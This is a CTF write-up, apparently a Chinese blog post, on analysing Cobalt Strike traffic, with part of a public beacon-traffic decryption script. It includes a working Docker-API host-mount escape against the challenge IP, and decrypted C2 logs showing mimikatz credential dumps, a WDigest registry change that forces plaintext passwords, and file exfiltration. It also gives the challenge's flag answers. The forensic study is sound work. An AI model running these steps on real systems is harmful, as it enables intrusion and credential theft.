class="line"></span><br><span class="line">    oOutput.Line(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(oCSParser.dCallbacksSummary) &gt; <span class="number">0</span>:</span><br><span class="line">        oOutput.Line(<span class="string">'Callbacks summary:'</span>)</span><br><span class="line">        <span class="keyword">for</span> callback, counter <span class="keyword">in</span> sorted(oCSParser.dCallbacksSummary.items()):</span><br><span class="line">            oOutput.Line(<span class="string">' %d %s: %d'</span> % (callback, oCSParser.LookupCallback(callback), counter))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCaptureCallback</span><span class="params">(hexdata, options)</span>:</span></span><br><span class="line">    oOutput = InstantiateCOutput(options)</span><br><span class="line">    oCSParser = cCSParser(options.rawkey, options.hmacaeskeys, <span class="literal">True</span>, <span class="literal">True</span>, <span class="string">''</span>, options.extract, oOutput)</span><br><span class="line">    oCSParser.ProcessPostPacketData(hexdata)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCaptureCallbackSingle</span><span class="params">(hexdata, options)</span>:</span></span><br><span class="line">    oOutput = InstantiateCOutput(options)</span><br><span class="line">    oCSParser = cCSParser(options.rawkey, options.hmacaeskeys, <span class="literal">True</span>, <span class="literal">False</span>, <span class="string">''</span>, options.extract, oOutput)</span><br><span class="line">    oCSParser.ProcessPostPacketData(hexdata)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCaptureTask</span><span class="params">(hexdata, options)</span>:</span></span><br><span class="line">    oOutput = InstantiateCOutput(options)</span><br><span class="line">    oCSParser = cCSParser(options.rawkey, options.hmacaeskeys, <span class="literal">True</span>, <span class="literal">False</span>, <span class="string">''</span>, options.extract, oOutput)</span><br><span class="line">    oCSParser.ProcessReplyPacketData(hexdata)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AnalyzeCapture</span><span class="params">(filename, options)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> options.displayfilter == <span class="string">''</span>:</span><br><span class="line">        options.displayfilter = options.format</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.format == <span class="string">'http'</span>:</span><br><span class="line">        AnalyzeCaptureHTTP(filename, options)</span><br><span class="line">    <span class="keyword">elif</span> options.format == <span class="string">'dns'</span>:</span><br><span class="line">        AnalyzeCaptureDNS(filename, options)</span><br><span class="line">    <span class="keyword">elif</span> options.format == <span class="string">'callback'</span>:</span><br><span class="line">        AnalyzeCaptureCallback(filename, options)</span><br><span class="line">    <span class="keyword">elif</span> options.format == <span class="string">'callbacksingle'</span>:</span><br><span class="line">        AnalyzeCaptureCallbackSingle(filename, options)</span><br><span class="line">    <span class="keyword">elif</span> options.format == <span class="string">'task'</span>:</span><br><span class="line">        AnalyzeCaptureTask(filename, options)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Unknown format: %s'</span> % options.format)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ProcessArguments</span><span class="params">(arguments, options)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> argument <span class="keyword">in</span> arguments:</span><br><span class="line">        AnalyzeCapture(argument, options)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Main</span><span class="params">()</span>:</span></span><br><span class="line">    moredesc = <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">@file: process each file listed in the text file specified</span></span><br><span class="line"><span class="string">wildcards are supported</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Source code put in the public domain by Didier Stevens, no Copyright</span></span><br><span class="line"><span class="string">Use at your own risk</span></span><br><span class="line"><span class="string">https://DidierStevens.com'''</span></span><br><span class="line"></span><br><span class="line">    oParser = optparse.OptionParser(usage=<span class="string">'usage: %prog [options] [[@]file ...]\n'</span> + __description__ + moredesc, version=<span class="string">'%prog '</span> + __version__)</span><br><span class="line">    oParser.add_option(<span class="string">'-m'</span>, <span class="string">'--man'</span>, action=<span class="string">'store_true'</span>, default=<span class="literal">False</span>, help=<span class="string">'Print manual'</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-o'</span>, <span class="string">'--output'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">'Output to file (# supported)'</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-f'</span>, <span class="string">'--format'</span>, type=str, default=<span class="string">'http'</span>, help=<span class="string">'Format: http/dns/task/callback/callbacksingle (default http)'</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-e'</span>, <span class="string">'--extract'</span>, action=<span class="string">'store_true'</span>, default=<span class="literal">False</span>, help=<span class="string">'Extract payloads to disk'</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-r'</span>, <span class="string">'--rawkey'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">"CS beacon's raw key"</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-k'</span>, <span class="string">'--hmacaeskeys'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">"HMAC and AES keys in hexadecimal separated by :"</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-Y'</span>, <span class="string">'--displayfilter'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">"Tshark display filter (default http/dns)"</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-t'</span>, <span class="string">'--transform'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">'Transformation instructions'</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-i'</span>, <span class="string">'--dnsidle'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">"DNS idle value"</span>)</span><br><span class="line">    oParser.add_option(<span class="string">'-b'</span>, <span class="string">'--beaconid'</span>, type=str, default=<span class="string">''</span>, help=<span class="string">"Beacond ID (hexadecimal)"</span>)</span><br><span class="line">    (options, args) = oParser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.man:</span><br><span class="line">        oParser.print_help()</span><br><span class="line">        PrintManual()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    ProcessArguments(args, options)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Main()</span><br></pre></td></tr></table></figure>

<p>通过<code>cs-parse-http-traffic.py -r raw.key. -Y 流量包过滤出cs流量包 -e 文件</code>对cs流量批量提取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cs-parse-http-traffic.py -r   a4553adf7a841e1dcf708afc912275ee    -Y &#39;http &amp;&amp; !(http.host &#x3D;&#x3D; &quot;r4---sn-ni57rn7y.gvt1-cn.com&quot;)&#39; -e  .&#x2F;cs流量分析.pcapng  &gt;1111.txt</span><br></pre></td></tr></table></figure>

<h2 id="CobaltStrike流量分析-解题记录"><a href="#CobaltStrike流量分析-解题记录" class="headerlink" title="CobaltStrike流量分析-解题记录"></a>CobaltStrike流量分析-解题记录</h2><h4 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h4><p>通过fscan扫描靶机，发现有poc-yaml-docker-api-unauthorized-rce</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">╰ .&#x2F;fscan_mac -h  52.82.27.30</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;</span><br><span class="line">&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">52.82.27.30:2375 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http:&#x2F;&#x2F;52.82.27.30:2375   code:404 len:29     title:None</span><br><span class="line">[+] PocScan http:&#x2F;&#x2F;52.82.27.30:2375 poc-yaml-docker-api-unauthorized-rce</span><br><span class="line">[+] PocScan http:&#x2F;&#x2F;52.82.27.30:2375 poc-yaml-go-pprof-leak</span><br><span class="line">已完成 1&#x2F;1</span><br><span class="line">[*] 扫描结束,耗时: 10.63908723s</span><br></pre></td></tr></table></figure>

<p>通过 poc-yaml-docker-api-unauthorized-rce 漏洞远程未授权访问docker ，在通过/mnt挂载提权：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H tcp://52.82.27.30:2375 ps </span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">nginx        latest    97662d24417b   2 months ago   192MB</span><br><span class="line"></span><br><span class="line">$ docker  -H tcp://52.82.27.30  run -it   -v /:/mnt nginx  /bin/bash</span><br></pre></td></tr></table></figure>

<p>我们在root目录下发现了flag.txt ，并顺带找到.cobaltstrike.beacon_keys文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@4d8fa5ecd14a:&#x2F;mnt# cat    .&#x2F;root&#x2F;flag.txt </span><br><span class="line">flag&#123;6750ac374fdc3038a67e95e1f21d455c&#125;</span><br><span class="line">root@4d8fa5ecd14a:&#x2F;mnt# find  .  -name .cobaltstrike.beacon_keys</span><br><span class="line">.&#x2F;opt&#x2F;Cobalt_Strike_4.5&#x2F;Cobalt_Strike_4.5&#x2F;.cobaltstrike.beacon_keys</span><br><span class="line">root@4d8fa5ecd14a:&#x2F;mnt# cat .&#x2F;opt&#x2F;Cobalt_Strike_4.5&#x2F;Cobalt_Strike_4.5&#x2F;.cobaltstrike.beacon_keys | base64</span><br></pre></td></tr></table></figure>

<h4 id="黑客攻击的上线时间"><a href="#黑客攻击的上线时间" class="headerlink" title="黑客攻击的上线时间"></a>黑客攻击的上线时间</h4><p>follow查询第一心跳包的回包时间</p>
<p><img src="./image-20250426234022326.png" alt="image-20250426234022326"></p>
<p>发现时间为``Date: Wed, 12 Feb 2025 12:12:52 GMT`</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;en_US&#x2F;all.js HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: IyltNSnpj6lSGi0WGIaJIsFWg6Ko6V+20xExzajz0A3AkRi2MMWjLSZvHltXLFJg5joFEKQ8lQYKh96XCYfDMO3yWWCzyZdpoCLdWRNzR8FN3Z3buww8afGOhKe+NVEWFzTPafNZh3kFlWUf5zk&#x2F;etCn8WPy4qg4BArMvbx&#x2F;yqM&#x3D;</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident&#x2F;6.0; MASP)</span><br><span class="line">Host: 192.168.31.170</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.001836s</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Wed, 12 Feb 2025 12:12:52 GMT</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>换算为大陆时间后答案为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2025-02-12 20:12:52&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的隧道payload名字是什么？"><a href="#黑客使用的隧道payload名字是什么？" class="headerlink" title="黑客使用的隧道payload名字是什么？"></a>黑客使用的隧道payload名字是什么？</h4><p>用 1768.py 分析<code>stager Beacon</code>文件（本题为FJwV）可以看到payload type 为<code>windows-beacon_http-reverse_http</code>.另外说下我们也会看到get-uri 为<code>/en_US/all.js</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python3 .&#x2F;1768.py .&#x2F;FJwV</span><br><span class="line">File: .&#x2F;FJwV</span><br><span class="line">xorkey(chain): 0x1f6828ff</span><br><span class="line">length: 0x040e00ad</span><br><span class="line">xorkey b&#39;.&#39; 2e</span><br><span class="line">0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http</span><br><span class="line">0x0002 port                             0x0001 0x0002 80</span><br><span class="line">0x0003 sleeptime                        0x0002 0x0004 60000</span><br><span class="line">0x0004 maxgetsize                       0x0002 0x0004 1048576</span><br><span class="line">0x0005 jitter                           0x0001 0x0002 0</span><br><span class="line">0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d003081890281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0x0008 server,get-uri                   0x0003 0x0100 &#39;192.168.31.170,&#x2F;en_US&#x2F;all.js&#39;</span><br><span class="line">0x0043 DNS_STRATEGY                     0x0001 0x0002 0</span><br><span class="line">0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1</span><br><span class="line">0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1</span><br><span class="line">0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1</span><br></pre></td></tr></table></figure>

<p>因此flag为：<code>flag{windows-beacon_http-reverse_http}</code></p>
<h4 id="黑客获取到当前用户的明文密码是什么？"><a href="#黑客获取到当前用户的明文密码是什么？" class="headerlink" title="黑客获取到当前用户的明文密码是什么？"></a>黑客获取到当前用户的明文密码是什么？</h4><p>当我们通过第二节思路得到raw key后，同 cs-parse-http-traffic.py  解密如下解密流量包可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cs-parse-http-traffic.py -r   a4553adf7a841e1dcf708afc912275ee    -Y &#39;http &amp;&amp; !(http.host &#x3D;&#x3D; &quot;r4---sn-ni57rn7y.gvt1-cn.com&quot;)&#39; -e  .&#x2F;cs流量分析.pcapng  &gt;1111.txt</span><br></pre></td></tr></table></figure>

<p>在第36696包里，发现Username :为Administrator ，  password为 xj@cs123</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 36696</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 3236</span><br><span class="line">Counter: 6</span><br><span class="line">Callback: 32 CALLBACK_OUTPUT_UTF8</span><br><span class="line">b&#39;\nAuthentication Id : 0 ; 316127 (00000000:0004d2df)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : WIN-8FC6TKPDPOR\nLogon Server      : WIN-8FC6TKPDPOR\nLogon Time        : 2025&#x2F;2&#x2F;12 20:12:21\nSID               : S-1-5-21-1522707697-3945662422-3100628028-500\n\tmsv :\t\n\t [00000005] Primary\n\t * Username : Administrator\n\t * Domain   : WIN-8FC6TKPDPOR\n\t * NTLM     : 5eaa2d43f9b8083283605589576678ee\n\t * SHA1     : 89399e56450299e51f86de4f8c66b2835399d36e\n\ttspkg :\t\n\twdigest :\t\n\t * Username : Administrator\n\t * Domain   : WIN-8FC6TKPDPOR\n\t * Password : xj@cs123\n\tkerberos :\t\n\t * Username : Administrator\n\t * Domain   : WIN-8FC6TKPDPOR\n\t * Password : (null)\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 60842 (00000000:0000edaa)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : S-1-5-90-0-1\n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\t * Username : WIN-8FC6TKPDPOR$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tkerberos :\t\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WIN-8FC6TKPDPOR$\nDomain            : WORKGROUP\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : S-1-5-20\n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\t * Username : WIN-8FC6TKPDPOR$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tkerberos :\t\n\t * Username : win-8fc6tkpdpor$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 38495 (00000000:0000965f)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : \n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\tkerberos :\t\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : S-1-5-19\n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\t * Username : (null)\n\t * Domain   : (null)\n\t * Password : (null)\n\tkerberos :\t\n\t * Username : (null)\n\t * Domain   : (null)\n\t * Password : (null)\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 60891 (00000000:0000eddb)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : S-1-5-90-0-1\n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\t * Username : WIN-8FC6TKPDPOR$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tkerberos :\t\n\tssp :\t\n\tcredman :\t\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WIN-8FC6TKPDPOR$\nDomain            : WORKGROUP\nLogon Server      : (null)\nLogon Time        : 2025&#x2F;2&#x2F;12 20:06:21\nSID               : S-1-5-18\n\tmsv :\t\n\ttspkg :\t\n\twdigest :\t\n\t * Username : WIN-8FC6TKPDPOR$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tkerberos :\t\n\t * Username : win-8fc6tkpdpor$\n\t * Domain   : WORKGROUP\n\t * Password : (null)\n\tssp :\t\n\tcredman :\t\n&#39;</span><br><span class="line">Extra packet data: b&#39;u&#39;</span><br></pre></td></tr></table></figure>

<h4 id="黑客为了得到明文密码修改了什么？（提交flag-md5-执行的命令-）"><a href="#黑客为了得到明文密码修改了什么？（提交flag-md5-执行的命令-）" class="headerlink" title="黑客为了得到明文密码修改了什么？（提交flag{md5(执行的命令)}）"></a>黑客为了得到明文密码修改了什么？（提交flag{md5(执行的命令)}）</h4><p>分析上一个问题时间我们可以发现，在第36696包前，我们先在第21645号包里尝试用<code>mimikatz sekurlsa::logonpasswords</code>来读取密码码，但是在第21766包并没有回显出密码。于是在后续包中，攻击者执行两个命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 24372</span><br><span class="line">HTTP response (for request 24366 GET)</span><br><span class="line">Length raw data: 176</span><br><span class="line">Timestamp: 1739362482 20250212-121442</span><br><span class="line">Data size: 145</span><br><span class="line">Command: 78 COMMAND_EXECUTE_JOB</span><br><span class="line"> Command: b&#39;%COMSPEC%&#39;</span><br><span class="line"> Arguments: b&#39; &#x2F;C reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f&#39;</span><br><span class="line"> Integer: 0</span><br><span class="line"></span><br><span class="line">Packet number: 24372</span><br><span class="line">HTTP request </span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;en_US&#x2F;all.js</span><br><span class="line">Length raw data: 176</span><br><span class="line">HMAC signature invalid</span><br><span class="line"></span><br><span class="line">Packet number: 24389</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 68</span><br><span class="line">Counter: 5</span><br><span class="line">Callback: 30 CALLBACK_OUTPUT_OEM</span><br><span class="line">b&#39;\xb2\xd9\xd7\xf7\xb3\xc9\xb9\xa6\xcd\xea\xb3\xc9\xa1\xa3\r\r\n&#39;</span><br><span class="line">Extra packet data: b&#39;\x003\x00&#39;</span><br><span class="line"></span><br><span class="line">Packet number: 25348</span><br><span class="line">HTTP response (for request 25342 GET)</span><br><span class="line">Length raw data: 96</span><br><span class="line">Timestamp: 1739362493 20250212-121453</span><br><span class="line">Data size: 70</span><br><span class="line">Command: 78 COMMAND_EXECUTE_JOB</span><br><span class="line"> Command: b&#39;%COMSPEC%&#39;</span><br><span class="line"> Arguments: b&#39; &#x2F;C rundll32.exe user32.dll,LockWorkStation&#39;</span><br><span class="line"> Integer: 0</span><br></pre></td></tr></table></figure>

<p>第一个是 里下发的`` /C reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`  :修改注册表，强制启用 WDigest 协议的身份验证功能，使系统在内存中以 <strong>明文形式</strong> 保存用户登录密码。 其中参数的具体含义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;v UseLogonCredential    # 操作的目标键值</span><br><span class="line">&#x2F;t REG_DWORD            # 键值类型为DWORD</span><br><span class="line">&#x2F;d 1                    # 设置值为1（启用危险功能）</span><br><span class="line">&#x2F;f                      # 强制覆盖不提示</span><br></pre></td></tr></table></figure>

<p>第二个是 第25348包里下发的<code>/C rundll32.exe user32.dll,LockWorkStation</code>:<strong>立即锁定当前用户的工作站</strong>（相当于按下 <code>Win + L</code> 快捷键）.两者配合下来修改注册表后锁屏后等待用户登录。题目问题是修改执行的命令，因此flag为第24372包里的命令的md5:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;md5( &#x2F;C reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f)&#125;</span><br><span class="line">flag&#123;73aeb8ee98d124a1f8e87f7965dc0b4a&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客下载的文件名称是什么？"><a href="#黑客下载的文件名称是什么？" class="headerlink" title="黑客下载的文件名称是什么？"></a>黑客下载的文件名称是什么？</h4><p>进行分析流量解密后记录，可以看到第38771号包的类型为：``COMMAND_DOWNLOAD` 下载。然后紧接着第38813号包为受害者的返回包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Packet number: 38771</span><br><span class="line">HTTP response (for request 38765 GET)</span><br><span class="line">Length raw data: 96</span><br><span class="line">Timestamp: 1739362546 20250212-121546</span><br><span class="line">Data size: 61</span><br><span class="line">Command: 11 COMMAND_DOWNLOAD</span><br><span class="line"> Arguments length: 53</span><br><span class="line"> b&#39;C:\\Users\\Administrator\\Desktop\\xxx\xb7\xfe\xce\xf1\xc6\xf7\xd4\xcb\xce\xac\xd0\xc5\xcf\xa2.xls</span><br><span class="line"> MD5: 66c26a1fd1208b12788ca581024da3eb</span><br><span class="line"></span><br><span class="line">Packet number: 38771</span><br><span class="line">HTTP request </span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;en_US&#x2F;all.js</span><br><span class="line">Length raw data: 96</span><br><span class="line">HMAC signature invalid</span><br><span class="line"></span><br><span class="line">Packet number: 38813</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 9500</span><br><span class="line">Counter: 8</span><br><span class="line">Callback: 2 CALLBACK_FILE</span><br><span class="line"> parameter1: 0</span><br><span class="line"> length: 9293</span><br><span class="line"> filenameDownload: b&#39;C:\\Users\\Administrator\\Desktop\\xxx\xb7\xfe\xce\xf1\xc6\xf7\xd4\xcb\xce\xac\xd0\xc5\xcf\xa2.xlsx&#39;</span><br><span class="line">Counter: 9</span><br><span class="line">Callback: 8 CALLBACK_FILE_WRITE</span><br><span class="line"> Length: 9293</span><br><span class="line"> MD5: 96b18bc8efd0963ad2c77d084d5c1e5d</span><br><span class="line">Extra packet data: b&#39;\x00\x00\x00&#39;</span><br><span class="line"></span><br><span class="line">Counter: 10</span><br><span class="line">Callback: 9 CALLBACK_FILE_CLOSE</span><br><span class="line">b&#39;\x00\x00\x00\x00&#39;</span><br></pre></td></tr></table></figure>

<p>将文件名gbk编码后我们可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&#39;C:\\Users\\Administrator\\Desktop\\xxx\xb7\xfe\xce\xf1\xc6\xf7\xd4\xcb\xce\xac\xd0\xc5\xcf\xa2.xls&#39;.decode(&#39;gbk&#39;)</span><br><span class="line">&#39;C:\\Users\\Administrator\\Desktop\\xxx服务器运维信息.xls&#39;</span><br></pre></td></tr></table></figure>

<p>即答案为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xxx服务器运维信息.xlsx&#125;</span><br></pre></td></tr></table></figure>

